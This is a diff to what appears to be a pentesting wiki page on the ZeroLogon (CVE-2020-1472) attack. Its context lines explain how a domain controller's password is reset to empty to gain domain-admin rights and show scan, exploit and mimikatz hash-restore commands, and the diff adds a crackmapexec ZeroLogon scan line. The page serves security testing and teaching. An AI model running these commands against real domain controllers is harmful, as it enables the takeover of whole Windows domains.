@@ -16,7 +16,7 @@ There were many concepts to understand in the original exploit scenario (the "[p
 * **Concept #2**: authentication through MS-NRPC uses a static and null IV (only `\x00` bytes, hence partly validating concept #1).
 * **Concept #3**: MS-NRPC signing and sealing don't rely on the same vulnerable mechanisms but are optional and can be ignored.
 * **Concept #4**: machine accounts have an unlimited number of login attempts, hence allowing for an authentication bypass and the spoofing of these accounts thanks to concepts #1 and #2 (by using a plaintext filled with `\x00` bytes and by doing enough attempts).
-* **Concept #5**: the `NetrServerPasswordSet2`  call can be used to reset an account's password. The new password structure to supply in this call has to be encrypted with the same vulnerable mechanisms stated in concepts #1 and #2.
+* **Concept #5**: the `NetrServerPasswordSet2` call can be used to reset an account's password. The new password structure to supply in this call has to be encrypted with the same vulnerable mechanisms stated in concepts #1 and #2.
 * **Concept #6**: the password structure can be filled with `\x00` bytes, leading to the setting a new password of a 0 characters length for the target account.
 * **Concept #7**: all previous concepts can be chained to reset a domain controller's password and obtain domain-admin privileges.
 
@@ -57,6 +57,7 @@ The original attack path can be conducted from UNIX-like systems with the follow
 ```bash
 # Scan for the vulnerability
 zerologon-scan 'DC_name' 'DC_IP_address'
+crackmapexec smb $DC_IP_address -u '' -p '' -M zerologon
 
 # Exploit the vulnerability: set the NT hash to \x00*8
 zerologon-exploit 'DC_name' 'DC_IP_address'
@@ -102,4 +103,3 @@ lsadump::changentlm /server:'Domain_controller' /user:'DC_account$' /oldntlm:'31
 {% embed url="https://www.secura.com/blog/zero-logon" %}
 
 {% embed url="https://github.com/dirkjanm/CVE-2020-1472" %}
-
